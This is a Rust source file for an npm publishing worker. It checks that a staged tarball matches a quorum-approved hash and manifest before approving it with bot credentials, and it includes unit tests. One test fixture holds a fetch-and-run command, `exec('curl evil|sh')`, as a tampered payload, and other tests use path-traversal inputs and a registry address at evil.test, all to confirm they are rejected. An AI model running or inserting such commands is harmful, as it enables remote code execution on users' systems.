//! Keyturn worker for npm.
//!
//! Given a staged package and the hash a quorum approved, the worker checks
//! that the staged tarball is byte for byte what was approved, approves it on
//! the registry with the bot credentials, and then checks the published
//! tarball again.
//!
//! The registry base URL is deliberately not part of the input. The input
//! comes from the contract request, and the credentials must never be sent to
//! an address chosen by the requester. The operator fixes the registry through
//! the environment instead.

pub mod http;
pub mod totp;

use http::{Http, Response};
use serde::{Deserialize, Serialize};
use sha2::{Digest, Sha256};
use std::io::Read;

pub const DEFAULT_REGISTRY: &str = "https://registry.npmjs.org";

#[derive(Deserialize, Debug, Clone)]
#[serde(deny_unknown_fields)]
pub struct Input {
    pub stage_id: String,
    pub package: String,
    pub version: String,
    /// SHA-256 of the tarball, lowercase hex, as approved on the contract.
    pub approved_hash: String,
}

pub struct Secrets {
    pub token: String,
    pub totp_secret: String,
}

#[derive(Serialize, Debug, PartialEq, Eq)]
pub struct Output {
    pub ok: bool,
    pub published_hash: Option<String>,
    pub error: Option<String>,
    pub detail: Option<String>,
}

impl Output {
    fn success(hash: String) -> Self {
        Self { ok: true, published_hash: Some(hash), error: None, detail: None }
    }

    fn failure(error: &str, detail: impl Into<String>) -> Self {
        Self { ok: false, published_hash: None, error: Some(error.to_string()), detail: Some(detail.into()) }
    }
}

fn sha256_hex(bytes: &[u8]) -> String {
    data_encoding::HEXLOWER.encode(&Sha256::digest(bytes))
}

fn is_uuid(s: &str) -> bool {
    let parts: Vec<&str> = s.split('-').collect();
    let lens = [8, 4, 4, 4, 12];
    parts.len() == 5
        && parts.iter().zip(lens).all(|(p, n)| p.len() == n && p.bytes().all(|b| b.is_ascii_hexdigit()))
}

fn is_sha256_hex(s: &str) -> bool {
    s.len() == 64 && s.bytes().all(|b| matches!(b, b'0'..=b'9' | b'a'..=b'f'))
}

fn valid_package_name(name: &str) -> bool {
    if name.is_empty() || name.len() > 214 {
        return false;
    }
    let ok_part = |p: &str| {
        !p.is_empty()
            && !p.starts_with('.')
            && !p.starts_with('_')
            && p.bytes().all(|b| matches!(b, b'a'..=b'z' | b'0'..=b'9' | b'-' | b'.' | b'_' | b'~'))
    };
    match name.strip_prefix('@') {
        Some(rest) => match rest.split_once('/') {
            Some((scope, pkg)) => ok_part(scope) && ok_part(pkg),
            None => false,
        },
        None => ok_part(name),
    }
}

fn valid_version(v: &str) -> bool {
    !v.is_empty()
        && v.len() <= 64
        && v.bytes().all(|b| b.is_ascii_alphanumeric() || matches!(b, b'.' | b'-' | b'+'))
}

/// Read name and version from `package/package.json` inside an npm tarball.
fn manifest_of(tarball: &[u8]) -> Result<(String, String), String> {
    let gz = flate2::read::GzDecoder::new(tarball);
    let mut archive = tar::Archive::new(gz);
    let entries = archive.entries().map_err(|_| "tarball is not a readable archive".to_string())?;
    for entry in entries {
        let mut entry = entry.map_err(|_| "tarball entry is unreadable".to_string())?;
        let path = entry.path().map_err(|_| "tarball entry has a bad path".to_string())?;
        if path.to_string_lossy() == "package/package.json" {
            let mut text = String::new();
            entry
                .by_ref()
                .take(1024 * 1024)
                .read_to_string(&mut text)
                .map_err(|_| "package.json is not valid text".to_string())?;
            let json: serde_json::Value =
                serde_json::from_str(&text).map_err(|_| "package.json is not valid JSON".to_string())?;
            let name = json.get("name").and_then(|v| v.as_str()).unwrap_or_default().to_string();
            let version = json.get("version").and_then(|v| v.as_str()).unwrap_or_default().to_string();
            return Ok((name, version));
        }
    }
    Err("package/package.json is missing from the tarball".to_string())
}

fn auth_headers<'a>(token: &'a str) -> [(&'a str, &'a str); 1] {
    [("authorization", token)]
}

fn ok_status(r: &Response) -> bool {
    (200..300).contains(&r.status)
}

pub fn run(input: &Input, secrets: &Secrets, registry: &str, http: &dyn Http, now_unix: u64) -> Output {
    if !is_uuid(&input.stage_id) {
        return Output::failure("bad_input", "stage_id is not a UUID");
    }
    if !is_sha256_hex(&input.approved_hash) {
        return Output::failure("bad_input", "approved_hash must be 64 lowercase hex characters");
    }
    if !valid_package_name(&input.package) {
        return Output::failure("bad_input", "package name is not a valid npm name");
    }
    if !valid_version(&input.version) {
        return Output::failure("bad_input", "version contains unexpected characters");
    }

    let base = registry.trim_end_matches('/');
    let bearer = format!("Bearer {}", secrets.token);

    // 1. Fetch the staged tarball and compare it with what the quorum approved.
    let tarball_url = format!("{}/-/stage/{}/tarball", base, input.stage_id);
    let staged = match http.get(&tarball_url, &auth_headers(&bearer)) {
        Ok(r) if ok_status(&r) => r.body,
        Ok(r) if r.status == 404 => return Output::failure("stage_not_found", "the staged package does not exist"),
        Ok(r) => return Output::failure("stage_fetch_failed", format!("registry answered {}", r.status)),
        Err(e) => return Output::failure("stage_fetch_failed", e),
    };
    let actual = sha256_hex(&staged);
    if actual != input.approved_hash {
        return Output::failure(
            "hash_mismatch",
            format!("staged tarball hash {} differs from the approved hash {}", actual, input.approved_hash),
        );
    }

    // 2. The approved bytes must also be the package and version we expect.
    match manifest_of(&staged) {
        Ok((name, version)) if name == input.package && version == input.version => {}
        Ok((name, version)) => {
            return Output::failure(
                "manifest_mismatch",
                format!("tarball declares {}@{}, expected {}@{}", name, version, input.package, input.version),
            )
        }
        Err(e) => return Output::failure("manifest_mismatch", e),
    }

    // 3. Approve on the registry with the bot credentials and a fresh one-time code.
    let code = match totp::totp(&secrets.totp_secret, now_unix) {
        Ok(c) => c,
        Err(e) => return Output::failure("bad_secret", e),
    };
    let approve_url = format!("{}/-/stage/{}/approve", base, input.stage_id);
    let headers = [("authorization", bearer.as_str()), ("npm-otp", code.as_str()), ("content-type", "application/json")];
    match http.post(&approve_url, &headers, b"") {
        Ok(r) if ok_status(&r) => {}
        Ok(r) => return Output::failure("approve_failed", format!("registry answered {}", r.status)),
        Err(e) => return Output::failure("approve_failed", e),
    }

    // 4. Check what was actually published.
    let encoded = input.package.replacen('/', "%2f", 1);
    let meta_url = format!("{}/{}/{}", base, encoded, input.version);
    let meta = match http.get(&meta_url, &[]) {
        Ok(r) if ok_status(&r) => r.body,
        Ok(r) => return Output::failure("post_check_failed", format!("version lookup answered {}", r.status)),
        Err(e) => return Output::failure("post_check_failed", e),
    };
    let tarball_href = serde_json::from_slice::<serde_json::Value>(&meta)
        .ok()
        .and_then(|v| v.pointer("/dist/tarball").and_then(|t| t.as_str()).map(str::to_string));
    let Some(href) = tarball_href else {
        return Output::failure("post_check_failed", "published version has no tarball address");
    };
    let published = match http.get(&href, &[]) {
        Ok(r) if ok_status(&r) => r.body,
        Ok(r) => return Output::failure("post_check_failed", format!("tarball download answered {}", r.status)),
        Err(e) => return Output::failure("post_check_failed", e),
    };
    let published_hash = sha256_hex(&published);
    if published_hash != input.approved_hash {
        return Output::failure(
            "post_check_failed",
            format!("published tarball hash {} differs from the approved hash", published_hash),
        );
    }
    Output::success(published_hash)
}

#[cfg(test)]
mod tests {
    use super::*;
    use flate2::write::GzEncoder;
    use flate2::Compression;
    use std::cell::RefCell;
    use std::collections::HashMap;

    const STAGE: &str = "6f1c2d3e-4a5b-4c6d-8e7f-0a1b2c3d4e5f";
    const REG: &str = "https://registry.test";
    const TOKEN: &str = "npm_botSecretToken123";
    const SECRET: &str = "GEZDGNBVGY3TQOJQGEZDGNBVGY3TQOJQ";

    fn tgz(name: &str, version: &str, filler: &str) -> Vec<u8> {
        let manifest = format!(r#"{{"name":"{}","version":"{}"}}"#, name, version);
        let enc = GzEncoder::new(Vec::new(), Compression::default());
        let mut b = tar::Builder::new(enc);
        for (path, data) in [("package/package.json", manifest.as_str()), ("package/index.js", filler)] {
            let mut h = tar::Header::new_gnu();
            h.set_size(data.len() as u64);
            h.set_mode(0o644);
            h.set_cksum();
            b.append_data(&mut h, path, data.as_bytes()).unwrap();
        }
        b.into_inner().unwrap().finish().unwrap()
    }

    #[derive(Default)]
    struct Fake {
        routes: HashMap<(String, String), (u16, Vec<u8>)>,
        calls: RefCell<Vec<(String, String, Vec<(String, String)>)>>,
    }

    impl Fake {
        fn route(mut self, method: &str, url: &str, status: u16, body: Vec<u8>) -> Self {
            self.routes.insert((method.to_string(), url.to_string()), (status, body));
            self
        }

        fn record(&self, method: &str, url: &str, headers: &[(&str, &str)]) {
            let h = headers.iter().map(|(k, v)| (k.to_string(), v.to_string())).collect();
            self.calls.borrow_mut().push((method.to_string(), url.to_string(), h));
        }

        fn answer(&self, method: &str, url: &str) -> Result<Response, String> {
            match self.routes.get(&(method.to_string(), url.to_string())) {
                Some((status, body)) => Ok(Response { status: *status, body: body.clone() }),
                None => Ok(Response { status: 404, body: vec![] }),
            }
        }

        fn posted(&self) -> usize {
            self.calls.borrow().iter().filter(|c| c.0 == "POST").count()
        }
    }

    impl Http for Fake {
        fn get(&self, url: &str, headers: &[(&str, &str)]) -> Result<Response, String> {
            self.record("GET", url, headers);
            self.answer("GET", url)
        }

        fn post(&self, url: &str, headers: &[(&str, &str)], _body: &[u8]) -> Result<Response, String> {
            self.record("POST", url, headers);
            self.answer("POST", url)
        }
    }

    fn input(hash: &str) -> Input {
        Input {
            stage_id: STAGE.into(),
            package: "leftpad".into(),
            version: "1.0.0".into(),
            approved_hash: hash.into(),
        }
    }

    fn secrets() -> Secrets {
        Secrets { token: TOKEN.into(), totp_secret: SECRET.into() }
    }

    fn registry_with(staged: Vec<u8>, published: Vec<u8>) -> Fake {
        let meta = format!(r#"{{"dist":{{"tarball":"{}/leftpad/-/leftpad-1.0.0.tgz"}}}}"#, REG);
        Fake::default()
            .route("GET", &format!("{}/-/stage/{}/tarball", REG, STAGE), 200, staged)
            .route("POST", &format!("{}/-/stage/{}/approve", REG, STAGE), 200, b"{}".to_vec())
            .route("GET", &format!("{}/leftpad/1.0.0", REG), 200, meta.into_bytes())
            .route("GET", &format!("{}/leftpad/-/leftpad-1.0.0.tgz", REG), 200, published)
    }

    #[test]
    fn publishes_exactly_what_was_approved() {
        let bytes = tgz("leftpad", "1.0.0", "module.exports = 1");
        let hash = sha256_hex(&bytes);
        let http = registry_with(bytes.clone(), bytes);
        let out = run(&input(&hash), &secrets(), REG, &http, 59);
        assert_eq!(out, Output::success(hash));

        let calls = http.calls.borrow();
        let approve = calls.iter().find(|c| c.0 == "POST").unwrap();
        let header = |name: &str| approve.2.iter().find(|h| h.0 == name).map(|h| h.1.clone());
        assert_eq!(header("authorization").as_deref(), Some("Bearer npm_botSecretToken123"));
        assert_eq!(header("npm-otp").as_deref(), Some("287082"));
        // The published tarball is fetched without credentials.
        let last = calls.last().unwrap();
        assert!(last.2.is_empty());
    }

    #[test]
    fn refuses_a_tarball_changed_after_approval() {
        let approved = tgz("leftpad", "1.0.0", "module.exports = 1");
        let swapped = tgz("leftpad", "1.0.0", "require('child_process').exec('curl evil|sh')");
        let hash = sha256_hex(&approved);
        let http = registry_with(swapped.clone(), swapped);
        let out = run(&input(&hash), &secrets(), REG, &http, 59);
        assert!(!out.ok);
        assert_eq!(out.error.as_deref(), Some("hash_mismatch"));
        assert_eq!(http.posted(), 0, "nothing may be approved on a mismatch");
    }

    #[test]
    fn refuses_a_tarball_for_a_different_version() {
        let bytes = tgz("leftpad", "9.9.9", "module.exports = 1");
        let hash = sha256_hex(&bytes);
        let http = registry_with(bytes.clone(), bytes);
        let out = run(&input(&hash), &secrets(), REG, &http, 59);
        assert_eq!(out.error.as_deref(), Some("manifest_mismatch"));
        assert_eq!(http.posted(), 0);
    }

    #[test]
    fn refuses_a_tarball_for_a_different_package() {
        let bytes = tgz("evilpad", "1.0.0", "module.exports = 1");
        let hash = sha256_hex(&bytes);
        let http = registry_with(bytes.clone(), bytes);
        let out = run(&input(&hash), &secrets(), REG, &http, 59);
        assert_eq!(out.error.as_deref(), Some("manifest_mismatch"));
        assert_eq!(http.posted(), 0);
    }

    #[test]
    fn reports_a_registry_that_refuses_the_approval() {
        let bytes = tgz("leftpad", "1.0.0", "module.exports = 1");
        let hash = sha256_hex(&bytes);
        let http = registry_with(bytes.clone(), bytes)
            .route("POST", &format!("{}/-/stage/{}/approve", REG, STAGE), 401, vec![]);
        let out = run(&input(&hash), &secrets(), REG, &http, 59);
        assert_eq!(out.error.as_deref(), Some("approve_failed"));
    }

    #[test]
    fn flags_a_published_tarball_that_differs() {
        let bytes = tgz("leftpad", "1.0.0", "module.exports = 1");
        let other = tgz("leftpad", "1.0.0", "module.exports = 2");
        let hash = sha256_hex(&bytes);
        let http = registry_with(bytes, other);
        let out = run(&input(&hash), &secrets(), REG, &http, 59);
        assert_eq!(out.error.as_deref(), Some("post_check_failed"));
    }

    #[test]
    fn reports_a_missing_stage() {
        let http = Fake::default();
        let out = run(&input(&"a".repeat(64)), &secrets(), REG, &http, 59);
        assert_eq!(out.error.as_deref(), Some("stage_not_found"));
    }

    #[test]
    fn scoped_names_are_encoded_in_the_lookup() {
        let manifest_bytes = tgz("@acme/util", "2.0.0", "x");
        let hash = sha256_hex(&manifest_bytes);
        let meta = format!(r#"{{"dist":{{"tarball":"{}/dl.tgz"}}}}"#, REG);
        let http = Fake::default()
            .route("GET", &format!("{}/-/stage/{}/tarball", REG, STAGE), 200, manifest_bytes.clone())
            .route("POST", &format!("{}/-/stage/{}/approve", REG, STAGE), 200, vec![])
            .route("GET", &format!("{}/@acme%2futil/2.0.0", REG), 200, meta.into_bytes())
            .route("GET", &format!("{}/dl.tgz", REG), 200, manifest_bytes);
        let mut i = input(&hash);
        i.package = "@acme/util".into();
        i.version = "2.0.0".into();
        assert!(run(&i, &secrets(), REG, &http, 59).ok);
    }

    #[test]
    fn rejects_bad_input_before_any_request() {
        let http = Fake::default();
        let good = "a".repeat(64);
        let mut i = input(&good);
        i.stage_id = "../../etc".into();
        assert_eq!(run(&i, &secrets(), REG, &http, 59).error.as_deref(), Some("bad_input"));
        let mut i = input("XYZ");
        i.stage_id = STAGE.into();
        assert_eq!(run(&i, &secrets(), REG, &http, 59).error.as_deref(), Some("bad_input"));
        let mut i = input(&good);
        i.package = "Evil/../pkg".into();
        assert_eq!(run(&i, &secrets(), REG, &http, 59).error.as_deref(), Some("bad_input"));
        let mut i = input(&good);
        i.version = "1.0.0/../x".into();
        assert_eq!(run(&i, &secrets(), REG, &http, 59).error.as_deref(), Some("bad_input"));
        assert!(http.calls.borrow().is_empty());
    }

    #[test]
    fn input_cannot_name_a_registry() {
        let raw = format!(
            r#"{{"stage_id":"{}","package":"leftpad","version":"1.0.0","approved_hash":"{}","registry_url":"https://evil.test"}}"#,
            STAGE,
            "a".repeat(64)
        );
        assert!(serde_json::from_str::<Input>(&raw).is_err());
    }

    #[test]
    fn credentials_never_appear_in_the_output() {
        let bytes = tgz("leftpad", "1.0.0", "x");
        let hash = sha256_hex(&bytes);
        let http = registry_with(bytes.clone(), bytes)
            .route("POST", &format!("{}/-/stage/{}/approve", REG, STAGE), 401, vec![]);
        let out = serde_json::to_string(&run(&input(&hash), &secrets(), REG, &http, 59)).unwrap();
        assert!(!out.contains(TOKEN));
        assert!(!out.contains(SECRET));
    }
}
